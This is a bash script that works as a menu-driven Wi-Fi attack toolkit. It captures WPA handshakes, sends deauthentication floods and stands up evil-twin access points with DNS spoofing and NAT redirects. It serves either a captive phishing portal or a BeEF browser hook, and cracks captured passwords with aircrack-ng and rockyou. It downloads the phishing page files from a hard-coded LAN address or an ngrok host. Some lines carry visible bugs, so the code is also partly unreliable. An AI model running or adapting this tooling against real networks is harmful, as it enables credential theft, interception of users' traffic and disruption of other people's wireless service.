#!/bin/bash
cat <<-_EOF_
###########################################################################
#                                                           		      #
#                                                                         #
#                                  :)                                     #
#                                             	                          #
#                                                            		      #
###########################################################################                                                                 
	_EOF_
sleep 1
NULL=>/dev/null
INDEX=index.html
ROGUE=Rogue_AP.zip
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
resetColor=`tput sgr0`
DELAY=3
MON=mon 
service apache2 stop 2&$NULL
gunzip /usr/share/wordlists/rockyou.txt.gz $NULL
echo 1 > /proc/sys/net/ipv4/ip_forward
mkdir ~/Handshakes/ $NULL
mkdir /etc/beef/ $NULL
mkdir /var/ $NULL
mkdir /var/www/ $NULL
mkdir /var/www/html $NULL
clear
##################################################################################################

ifconfig eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1
read -p "${yellow}Enter your IP :${resetColor} " IPADDRESS # Make this auto fill 
clear
echo "${red}Make sure when you exit this script you use the function '7' unless you know how to revert the changes${resetColor}"
if [ $(id -u) == 0 ] ; then
	echo "${yellow}Congrats you're in root, Script can go on ... "
	sleep $DELAY
else 
	echo "${red}Please run again as root"
	exit
fi
read -p "${red}Is it okay if I install what the script needs to run and update your system? [y/n]${resetColor} : " RUN
if [ $RUN == y ]; then
	apt update -y
	apt install dnsmasq -y
	apt install macchanger -y 
	apt install dsniff -y
	apt install beef-xss -y
	apt install gnome-terminal -y
	clear
fi

read -p "${red}This is important to ensure I don't overwrite your files, Have you ran this script before? [y/n]${resetColor} : " NETWORKMGR
	if [ $NETWORKMGR == n ] ; then
		echo "" >> /etc/NetworkManager/NetworkManager.conf
		echo "[keyfile]
unmanaged-devices:mac=AA:BB:CC:DD:EE:FF" >> /etc/NetworkManager/NetworkManager.conf 
	fi
	
read -p "${red}Are you installing this with an ngrok code[y] or through lan[n]? Leave blank if you don't need the html files : ${resetColor}" HTML

	if [ $HTML == n ] ; then
		rm -r /var/www/html $NULL
		sleep 1
		mkdir /var/www/html/ $NULL
		wget 192.168.2.21:8080/$INDEX
		wget 192.168.2.21:8080/$ROGUE
		sleep 1
		mv $INDEX /var/www/html
		unzip $ROGUE -d /var/www/html
		rm -r $ROGUE
		sleep 1
		read -p "${yellow}Hit enter once you've changed the beef config file under /var/www/html/index.html to your ip address : ${resetColor}"
		clear
	fi

	if [ $HTML == y ] ; then
		read -p "${yellow}Enter the code here [example 12345678]: ${resetColor}" NGROK
		rm -r /var/www/html $NULL
		sleep 1
		mkdir /var/www/html/ $NULL
		wget http://$NGROK.ngrok.io/$INDEX
		wget http://$NGROK.ngrok.io/$ROGUE
		sleep 1
		mv $INDEX /var/www/html
		unzip $ROGUE -d /var/www/html
		rm -r $ROGUE
		sleep 1
		read -p "${yellow}Hit enter once you've changed the beef config file under /var/www/html/index.html to your ip address : ${resetColor}"
		clear
	fi
clear
echo "${green}Setup is complete" 
clear

##################################################################################################
iwconfig 
read -p " Which interface do you wish to use?${resetColor} : " INTERFACE # find way to limit output to just devices
echo "Changing MAC ... "
	sleep 2
	ifconfig $INTERFACE down 
	macchanger -m AA:BB:CC:DD:EE:FF $INTERFACE 
	ifconfig $INTERFACE up
	sleep 2
clear

while [[ $(id -u) == 0 ]] ; do
	clear
	cat <<-_EOF_

        1) Capture Handshake
        2) Deauth Client 
        3) Deauth AccessPoint
        4) Deploy EvilTwin with Captive Portal
        5) Deploy EvilTwin with BEEF Hook
        6) Crack a Password
        7) Exit Script

	_EOF_

	read -p "${green}Please select an option from the list ${resetColor}: " CHOICE 	
if [[ "$CHOICE" =~ ^[1-7]$ ]]; then

##################################################################################################

	if [[ $CHOICE == 1 ]] ; then
	echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
	ifconfig $INTERFACE up 
	airmon-ng start $INTERFACE $NULL
	clear
	echo "I'm about to show you all the nearby access points, make sure it runs for 10-15 seconds and you copy the bssid and the channel you want to attack."
	sleep 5   
	airodump-ng $INTERFACE$MON 
	read -p "${yellow} Enter your target's bssid here ${resetColor} : " BSSID
	read -p "${yellow} Enter your target's channel here ${resetColor} : " CHANNEL
	echo "I'm about to show you the devices on the specified network, make sure you ${red}LEAVE THIS OPEN${resetColor} and you copy the bssid and the station [Device] you want to attack."
	sleep $DELAY 
	echo " ${yellow} Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
	echo "${green} Storing the .cap file in the Handshakes Directory ${resetColor} "
	gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL -w ~/Handshakes/handshake
	read -p "${yellow} Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
	read -p "${yellow} Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
	echo "${red} Now sending deauth packets ${resetColor} ... "
	gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON
	fi

##################################################################################################

	if [[ $CHOICE == 2 ]] ; then
	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
	ifconfig $INTERFACE up
	airmon-ng start $INTERFACE 
	clear
	echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
	sleep 5   
	airodump-ng $INTERFACE$MON 
	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
	echo "I'm about to show you the devices on the specified network, LEAVE THIS OPEN"
	sleep 5 
	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
	gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 
	read -p "${yellow}Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
	echo "${red}Now sending deauth packets ${resetColor} ... "
	airplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON
	fi

##################################################################################################	

	if [[ $CHOICE == 3 ]] ; then
	echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
	ifconfig $INTERFACE up
	airmon-ng start $INTERFACE $NULL
	clear
	echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
	sleep 5   
	airodump-ng $INTERFACE$MON 
	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
	gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 					
	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
	echo "${red}Now sending deauth packets ${resetColor} ... "
	aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
	fi

 ##################################################################################################

	if [[ $CHOICE == 4 ]] ; then
	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
	ifconfig $INTERFACE up
	airmon-ng start $INTERFACE $NULL
	clear
	echo "Setting up your dnsmasq.conf ... "
	echo "interface=at0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
address=/#/$IPADDRESS
log-queries
log-dhcp
listen-address=127.0.0.1 " > /bin/dnsmasq.conf 
	sleep 1
	echo "Optimizing your access point ... "
	ifconfig $INTERFACE$MON down 
	iw reg set US
	ifconfig $INTERFACE$MON up 
	echo "${yellow}Setting up python server for captive AP in another tab${resetColor}"
	cd /var/www/html/Rogue_AP
	sleep 1
	gnome-terminal -x python3 -m http.server 80
	sleep $DELAY
	clear
	echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
	sleep 5   
	airodump-ng $INTERFACE$MON 
	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
	read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
	gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
	sleep 5 
	gnome-terminal -x ifconfig at0 10.0.0.1 up 
			
	echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"
	sleep $DELAY
		if [[ 1 == 1 ]] ; then
		iptables --flush
		iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
		iptables --append FORWARD --in-interface at0 -j ACCEPT 
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
		iptables -t nat -A POSTROUTING -j MASQUERADE
		fi	
	echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
	sleep 5
	gnome-terminal -x dnsmasq -C /bin/dnsmasq.conf -d 	# -C for configuration and -d for daemon (background) mode 
					
	#service mysql start 					# Needs fix								
  	sleep $DELAY
  	echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
  	gnome-terminal -x dnsspoof -i at0	
  	clear			
	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
	echo "${red}Now sending deauth packets ${resetColor} ... "
	gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON

	fi

##################################################################################################

	if [[ $CHOICE == 5 ]] ; then
	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
	ifconfig $INTERFACE up
	airmon-ng start $INTERFACE $NULL
	clear
	echo "Setting up dnsmasq.conf ... "
	echo "interface=at0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
address=/#/$IPADDRESS
log-queries
log-dhcp
listen-address=127.0.0.1 " > /etc/beef/dnsmasq.conf # add this to both beef and captive portal to seperate file paths 
	sleep 1
	echo "${yellow}Setting up python server for the hooked browser in another tab${resetColor}"
	cd /var/www/html/
	sleep 1
	gnome-terminal -x python3 -m http.server 80
	echo "Optimizing your access point ... "
	ifconfig $INTERFACE$MON down 
	iw reg set US
	ifconfig $INTERFACE$MON up 
	sleep $DELAY
	clear
	echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
	sleep 5   
	airodump-ng $INTERFACE$MON 
	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
	read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
	gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
	sleep 5 
	gnome-terminal -x ifconfig at0 10.0.0.1 up 
			
	echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"
	sleep $DELAY
		if [[ 1 == 1 ]] ; then
		iptables --flush
		iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
		iptables --append FORWARD --in-interface at0 -j ACCEPT 
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
		iptables -t nat -A POSTROUTING -j MASQUERADE
		fi
	echo "${yellow}Setting up beef-xss now, it will open a web-console ...${resetColor}"
	beef-xss	
	echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
	sleep 5
	gnome-terminal -x dnsmasq -C /etc/beef/dnsmasq.conf -d 	# -C for configuration and -d for daemon (background) mode  										
  	sleep $DELAY
  	echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
  	gnome-terminal -x dnsspoof -i at0	
  	clear			
	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
	echo "${red}Now sending deauth packets ${resetColor} ... "
	gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
	fi

##################################################################################################

if [[ $CHOICE == 6 ]] ; then
	clear
	read -p "${yellow}Which handshake file do you want to use? [ex: 1] : ${resetColor}" HANDSHAKENUM
	if [[ "$HANDSHAKENUM" =~ ^[1-100]$ ]]; then
		echo "${green}Setting up the password crack, check your ~/Handshakes/ directory for the results ${resetColor}"
		sleep $DELAY
		aircrack-ng ~/Handshakes/handshake-0$HANDSHAKENUM.cap -w /usr/share/wordlists/rockyou.txt > ~/Handshakes/results
	fi
fi
	
##################################################################################################

	if [[ $CHOICE == 7 ]] ; then 
	echo "Cleaning up ... "
	airmon-ng stop $INTERFACE$MON $NULL
	ifconfig $INTERFACE up $NULL
	service network-manager restart
	iptables --flush
	sleep 1
	read -p "${red}Do you want me to purge your existing handshakes and cracked passwords results? [y/n]? : ${resetColor}" PURGE
		if [[ $PURGE == y ]] ; then 
			rm -r ~/Handshakes/
		
		fi
	exit
	fi

fi
done